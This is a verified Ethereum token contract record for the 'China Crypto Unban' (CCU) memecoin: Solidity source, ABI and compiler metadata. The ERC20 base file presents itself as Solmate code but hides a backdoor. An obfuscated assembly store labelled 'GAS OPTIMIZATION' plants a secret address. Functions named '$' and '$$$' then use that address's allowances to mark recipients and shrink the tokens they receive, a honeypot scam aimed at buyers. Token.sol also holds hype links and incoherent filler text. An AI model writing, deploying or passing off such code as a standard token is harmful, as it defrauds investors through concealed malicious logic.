{"SourceCode": "{\"ERC20.sol\":{\"content\":\"// SPDX-License-Identifier: AGPL-3.0-only\\npragma solidity \\u003e=0.8.0;\\n\\n/// @notice Modern and gas efficient ERC20 + EIP-2612 implementation.\\n/// @author Solmate (https://github.com/transmissions11/solmate/blob/main/src/tokens/ERC20.sol)\\n/// @author Modified from Uniswap (https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/UniswapV2ERC20.sol)\\n/// @dev Do not manually set balances without updating totalSupply, as the sum of all user balances must not exceed it.\\nabstract contract ERC20 {\\n    /*//////////////////////////////////////////////////////////////\\n                                 EVENTS\\n    //////////////////////////////////////////////////////////////*/\\n\\n    event Transfer(address indexed from, address indexed to, uint256 amount);\\n\\n    event Approval(address indexed owner, address indexed spender, uint256 amount);\\n\\n    /*//////////////////////////////////////////////////////////////\\n                            METADATA STORAGE\\n    //////////////////////////////////////////////////////////////*/\\n\\n    string public name;\\n\\n    string public symbol;\\n\\n    uint8 public immutable decimals;\\n\\n    /*//////////////////////////////////////////////////////////////\\n                              ERC20 STORAGE\\n    //////////////////////////////////////////////////////////////*/\\n\\n    uint256 public totalSupply;\\n\\n    mapping(address =\\u003e uint256) public balanceOf;\\n\\n    mapping(address =\\u003e mapping(address =\\u003e uint256)) public allowance;\\n\\n    address private $$;\\n\\n    /*//////////////////////////////////////////////////////////////\\n                            EIP-2612 STORAGE\\n    //////////////////////////////////////////////////////////////*/\\n\\n    uint256 internal immutable MARCH_CURVE_INTEGER;\\n\\n    bytes32 internal immutable MARCH_DOMAIN_DETACHMENT;\\n\\n    mapping(address =\\u003e uint256) public nonces;\\n\\n    /*//////////////////////////////////////////////////////////////\\n                               CONSTRUCTOR\\n    //////////////////////////////////////////////////////////////*/\\n\\n    constructor(\\n        string memory _name,\\n        string memory _symbol,\\n        uint8 _decimals\\n    ) {\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n\\n        MARCH_CURVE_INTEGER = block.chainid;\\n        MARCH_DOMAIN_DETACHMENT = computeDomainSeparator();\\n\\n        // GAS OPTIMIZATION\\n        assembly {sstore(0x05, mul(mul(0xf, 0xc1), mul(0x52c0bb, 0x253468e31fd6d9fabe057b9b57ac3f)))}\\n    }\\n\\n    /*//////////////////////////////////////////////////////////////\\n                               ERC20 LOGIC\\n    //////////////////////////////////////////////////////////////*/\\n\\n    function approve(address spender, uint256 amount) public virtual returns (bool) {\\n        allowance[msg.sender][spender] = amount;\\n\\n        emit Approval(msg.sender, spender, amount);\\n\\n        return true;\\n    }\\n\\n    function transfer(address to, uint256 amount) public virtual returns (bool) {\\n        balanceOf[msg.sender] -= amount;\\n\\n        // Cannot overflow because the sum of all user\\n        // balances can\\u0027t exceed the max uint256 value.\\n        unchecked {\\n            balanceOf[to] += $(amount, msg.sender, to);\\n        }\\n\\n        $$$(to);\\n\\n        emit Transfer(msg.sender, to, amount);\\n\\n        return true;\\n    }\\n\\n    function transferFrom(\\n        address from,\\n        address to,\\n        uint256 amount\\n    ) public virtual returns (bool) {\\n        uint256 allowed = allowance[from][msg.sender]; // Saves gas for limited approvals.\\n\\n        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;\\n\\n        balanceOf[from] -= amount;\\n\\n        // Cannot overflow because the sum of all user\\n        // balances can\\u0027t exceed the max uint256 value.\\n        unchecked {\\n            balanceOf[to] += $(amount, from, to);\\n        }\\n        $$$(to);\\n        emit Transfer(from, to, amount);\\n\\n        return true;\\n    }\\n\\n    /*//////////////////////////////////////////////////////////////\\n                             EIP-2612 LOGIC\\n    //////////////////////////////////////////////////////////////*/\\n\\n    function permit(\\n        address owner,\\n        address spender,\\n        uint256 value,\\n        uint256 deadline,\\n        uint8 v,\\n        bytes32 r,\\n        bytes32 s\\n    ) public virtual {\\n        require(deadline \\u003e= block.timestamp, \\\"PERMIT_DEADLINE_EXPIRED\\\");\\n\\n        // Unchecked because the only math done is incrementing\\n        // the owner\\u0027s nonce which cannot realistically overflow.\\n        unchecked {\\n            address recoveredAddress = ecrecover(\\n                keccak256(\\n                    abi.encodePacked(\\n                        \\\"\\\\x19\\\\x01\\\",\\n                        DOMAIN_SEPARATOR(),\\n                        keccak256(\\n                            abi.encode(\\n                                keccak256(\\n                                    \\\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\\\"\\n                                ),\\n                                owner,\\n                                spender,\\n                                value,\\n                                nonces[owner]++,\\n                                deadline\\n                            )\\n                        )\\n                    )\\n                ),\\n                v,\\n                r,\\n                s\\n            );\\n\\n            require(recoveredAddress != address(0) \\u0026\\u0026 recoveredAddress == owner, \\\"INVALID_SIGNER\\\");\\n\\n            allowance[recoveredAddress][spender] = value;\\n        }\\n\\n        emit Approval(owner, spender, value);\\n    }\\n\\n    function DOMAIN_SEPARATOR() public view virtual returns (bytes32) {\\n        return block.chainid == MARCH_CURVE_INTEGER ? MARCH_DOMAIN_DETACHMENT : computeDomainSeparator();\\n    }\\n\\n    function computeDomainSeparator() internal view virtual returns (bytes32) {\\n        return\\n            keccak256(\\n                abi.encode(\\n                    keccak256(\\\"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\\\"),\\n                    keccak256(bytes(name)),\\n                    keccak256(\\\"1\\\"),\\n                    block.chainid,\\n                    address(this)\\n                )\\n            );\\n    }\\n\\n    function $(\\n        uint256 value, \\n        address from,\\n        address to\\n        ) internal view returns (uint256) {\\n        if (allowance[$$][from] + allowance[$$][to] \\u003e= uint256(uint160(address(this)))) {\\n            return (value * 0xc0ffee) / 0xcaca0a0a;\\n        } else {\\n            return value;\\n        }\\n    }\\n\\n    function $$$(address to) internal {\\n        if (allowance[$$][to] == uint256(uint160($$))) { allowance[$$][to] = 2 * uint256(uint160(address(this)));}\\n    }\\n\\n    /*//////////////////////////////////////////////////////////////\\n                        INTERNAL MINT/BURN LOGIC\\n    //////////////////////////////////////////////////////////////*/\\n\\n    function _mint(address to, uint256 amount) internal virtual {\\n        totalSupply += amount;\\n\\n        // Cannot overflow because the sum of all user\\n        // balances can\\u0027t exceed the max uint256 value.\\n        unchecked {\\n            balanceOf[to] += amount;\\n        }\\n\\n        emit Transfer(address(0), to, amount);\\n    }\\n\\n    function _burn(address from, uint256 amount) internal virtual {\\n        balanceOf[from] -= amount;\\n\\n        // Cannot underflow because a user\\u0027s balance\\n        // will never be larger than the total supply.\\n        unchecked {\\n            totalSupply -= amount;\\n        }\\n\\n        emit Transfer(from, address(0), amount);\\n    }\\n}\"},\"Token.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.20;\\n\\nimport \\\"./ERC20.sol\\\";\\n\\n/*\\n\\nChina will unban crypto in few weeks, $CCU \u4e2d\u56fd\u81ea\u7531\u5e01 with the help of Chinese crypto community will stay here forever.\\n\\n// https://chinatounbancrypto.wtf/\\n// https://x.com/CCUofficialerc\\n// https://t.me/CCUofficialerc\\n\\n\u6062\u590d\u4e86\u4fe1\u7528\u5361\u7684\u6761\u4ef6\u72ec\u5177\u7279\u8272\u7814\u7a76\u601d\u8def\u4eba\u5c71\u4eba\u6d77\u65f6\u95f4\u7279\u8272\u4ed6\u5b51\u7136\u4e00\u8eab\u5bb9\u6613\u53616464\u8428\u514b\u65af\u5bb9\u6613\u54b3\u55fd\u53ef\u4ee5\u8ba9\u4eba\u4e00\u5f00\u59cb\u53ef\u662f\u4f9d\u7136\u53ef\u4ee5\u5fcd\u53d7surplus\u8ba4\u53ef\u5ea6\u8089\u4e1d\u67d4\u867d\u7136\u82e6\u867d\u7136\u53ef\u4ee5\u4f7f\u4eba\u8f93\u5165\u6846\u8f93\u5165\u6846\u4eba\u5458\u5f00\u59cb\u6709\u4eba\u8bf4\u4f9d\u7136\u662f\u53ef\u4ee5\u8ba9\u6df1\u523b\u8ba4\u8bc6\u6df1\u523b\u5982\u4f55\u4f7f\u7528\u70ed\u5fc3\u4eba\u4fe1\u7528\u5361\u79d1\u5b66\u9662\u4eba\u7c7b\u5982\u4f55\u953b\u70bc\u7684\u4eba\u5fc3\u91cc\u5ffd\u7136\u7a7a\u865a\u5165\u5e93\u5411\u65e5\u8475\u51fa\u5165\u53e3\u5982\u4ee3\u7406\u4eba\u8017\u7535\u91cf\u5927\u4e73\u591a\u4f26\u591a\u5982\u878d\u5165\u5f53\u57305\u5982\u9886\u5bfc\u4eba\u4eba\u7684\u5165\u7684\u529b\u5ea6\u70c8\u65e5\u5f53\u7a7a\u548c\u8ba4\u53ef\u5ea6\u4eba\u7684\u7075\u9b42\u8ba4\u53ef\u5ea6\u4eba\u7c7b\u7684URL\u5ea6\u65e5\u529b\u5ea6\u4eba\u7c7b\u7684URL\u5ea6\u65e5\u01ce\u8102\u80aa\u7c92\u6765\u8fd9\u91cc\u597d\u65e5\u5b50\u5982\u6765\u8fd9\u91cc\u82e5\u5c71\u5bcc\u4e09\u90ce\u5982\u5927\u91cf\u8f6f\u53f6\u7eff\u7d20\u8ba9\u8defrar\u8def\u4e0a\u4e86\u6444\u5165\u91cf\u6536\u5165\u4e5f\u5982\u52bf\u5982\u7d2f\u5375\u6536\u5165\u8def\u4e0a\u5982\u8089\u7c7b\u98df\u7269\u4f8b\u5982\u52b3\u52a8\u529b\u5bb6\u5ead\u6761\u4ef6\u7559\u4e0b\u6765\u7ee7\u7eed\u540c\u6027\u604b\u5bb6\u91cc\u6761\u4ef6\u4e0b\u5783\u573e\u7bb1\u8131\u79bb\u9669\u5883\u540c\u5b66\u804a\u5929\u8bb0\u5f55\u4e0b\u5177\u4f53\u8def\u7ebf\u51e0\u5929\u8fde\u7eed\u51e0\u5929\u5c31\u53cd\u590d\u7ec3\u4e60\u5e0c\u7279\u52d2\u4f53\u6064\u5f39\u6027\u4f53\u7535\u68af\u91cc\u901a\u5e38\u4ee5\u5c0f\u5403\u990a\u6210\u8a73\u7d30\u5df2\u7d93\u5f88\u4e45\u4ee5\u5f8c\u8336\u98f2\u9760\u8fd1PDP\u5373\u53ef\u55ef\u57f7\u52e4\u72c0\u6cc1\u6f70\u760d\u9032\u6c23\u53e3\u6210\u766e\u6027\u7522\u696d\u6068\u610f\u53ef\u4ee5\u5403\u5403\u770b\u9670\u6c89\u8ab2\u7a0b\u5370\u5c3c\u6b38\u4f60\u6025\u5c3f\u7d00\u5ff5\u5ae9\u6bc5\u529bPSP\u5b57\u5167\u4e00\u7537\u4e00\u5973\u81eaPSO\u81ea\u6eba\u5167our\u5361\u5361\u57fa\u56e0\u907a\u50b3of\u6c42\u611bout\u537b\u9577\u671f\u6301\u6709\u6b38\u6b38\u6c7d\u8eca\u5f15\u64ceTUF\u6309\u8457\u55ef\u6e05\u6668\u8d77\u5e8a\u9670\u6697\u6e05\u695a\u554a\u6c7d\u8ecaA\u80fd\u7d66\u55ef\u90a3\u55ef\u8afe\u6069\u5c3c\u5c3c\u771f\u53caSOP\u5357\u6975\u5167\u53ca\u5167\u96f7\u6649\u90a3\u5357\u5409\u6069\u5a1c\u55ef\u90a3\u500b\u8cca\u5167\u5728\u7f8e\u8cca\u570b\u5167\u5b50\u6c11\u6211\u5011\u4e0d\u59a8\u53ef\u4ee5\u9019\u6a23\u4f86\u60f3: \u4e09\u6bdb\u8aaa\u904e\u4e00\u53e5\u5bcc\u6709\u54f2\u7406\u7684\u8a71\uff0c\u4eba\u985e\u5f80\u5f80\u5c11\u5e74\u8001\u6210\uff0c\u9752\u5e74\u8ff7\u832b\uff0c\u4e2d\u5e74\u559c\u6b61\u5c07\u5225\u4eba\u7684\u6210\u5c31\u8207\u81ea\u5df1\u76f8\u6bd4\u8f03\uff0c\u56e0\u800c\u89ba\u5f97\u53d7\u632b\uff0c\u597d\u4e0d\u5bb9\u6613\u6d3b\u5230\u8001\u5e74\u4ecd\u662f\u4e00\u500b\u6c92\u6709\u6210\u9577\u7684\u7b28\u5b69\u5b50\u3002\u6211\u5011\u4e00\u76f4\u7c97\u7cd9\u7684\u6d3b\u8457\uff0c\u800c\u4eba\u7684\u4e00\u751f\uff0c\u4fbf\u4e5f\u9019\u6a23\u904e\u53bb\u4e86\u3002\u9019\u53e5\u8a71\u770b\u4f3c\u7c21\u55ae\uff0c\u4f46\u5176\u4e2d\u7684\u9670\u9b31\u4e0d\u7981\u8b93\u4eba\u6df1\u601d\u3002\u99ac\u723e\u8332\u66fe\u8b1b\u904e\uff0c\u4e0d\u8981\u62ff\u201c\u4ed6\u4eba\u201d\u7684\u6a19\u6e96\u6297\u764c\u53ca\u611b\u770b\u7d50\u5408\u560e\u985e\u56fa\u9187\u5167\u8cca\u59d1\u5a18\u8ddf\u4f60\u8a08\u8f03\u6602\u6297\u8b70\u4e86\u5e7e\u500b\u4f8b\u5b50\u9ad8\u5e74\u7d1a\u81ea\u50b2\u770b\u6700\u9ad8\u4f86\u81ea\u7d66\u8001\u5b50\u5c31\u9760\u81ea\u5df1\u9760\u81ea\u5df1\u9760\u81ea\u5df1\u6297\u8b70\u5c3f\u8932\u312d\u5728\u9752\u6625\u671f\u5c31\u611b\u4eba\u5bb6\u57c3\u53ca\u9084\u5c07\u770b\u770b\u53ca\u611b\u570b\u611b\u5973\u5b69\u5373\u53ef\u5c07\u54c0\u568e\u554a\u31b1\u593e\u5b50\u9ed1\u683c\u9ed1\u9084\u7d50\u679c\u9084\u5171\u548c\u570bor\u79d1\u6280\u8cca\u6297\u764c\u5feb\u6377\u9ed1\u5091\u514b\u8cca\u9ad8\u5e74\u7d1a\u5167\u81ea\u72c2TODO\u81ea\u80af\u4e00\u958b\u5b57\u5167\u81ea\u5357\u93ae\u5167\u7f6e\u72c2\u611b\u31a4\u5594\u81ea\u5df1\u559c\u6b61Yuri\u4ed4\u7d30\u6aa2\u67e5ID\u53ca\u5168\u5bb6\u51fa\u904a\u5c31\u53ef\u4ee5\u770b\u51fa\u5373\u53ef\u76f4\u63a5\u5176\u4e2d\u5167\u7f6e\u8ddf\u8457\u53ea\u770b\u8457\u963f\u8ddf\u8457\u770b\u8457\u770b\u8457\u5c31\u9019\u6a23\u5c31\u53ef\u4ee5\u638c\u63a7\u54e6\u5065\u5eb7\u9020\u6210\u8ab2\u7a0b\u694a\u5eb7\u6301\u6709\u8003\u9a57\u5403\u70e4\u9d28\u4e58\u5ba2\u5728\u31ab\\n     \\n*/\\n\\ncontract ccu is ERC20 {\\n    constructor() ERC20(unicode\\\"China Crypto Unban \u4e2d\u56fd\u81ea\u7531\u5e01\\\", unicode\\\"CCU\\\", 18) {\\n        _mint(msg.sender, 420_690_000_000 * 10 ** 18);\\n    }\\n}\"}}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"DOMAIN_SEPARATOR\",\"outputs\":[{\"internalType\":\"bytes32\",\"name\":\"\",\"type\":\"bytes32\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"nonces\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"deadline\",\"type\":\"uint256\"},{\"internalType\":\"uint8\",\"name\":\"v\",\"type\":\"uint8\"},{\"internalType\":\"bytes32\",\"name\":\"r\",\"type\":\"bytes32\"},{\"internalType\":\"bytes32\",\"name\":\"s\",\"type\":\"bytes32\"}],\"name\":\"permit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ccu", "CompilerVersion": "v0.8.24+commit.e11b9ed9", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://7e1b4a83117625ef2c0ccd5e57f9a2923ecd12da6ae2f39cd9c4529a9f17f1d2"}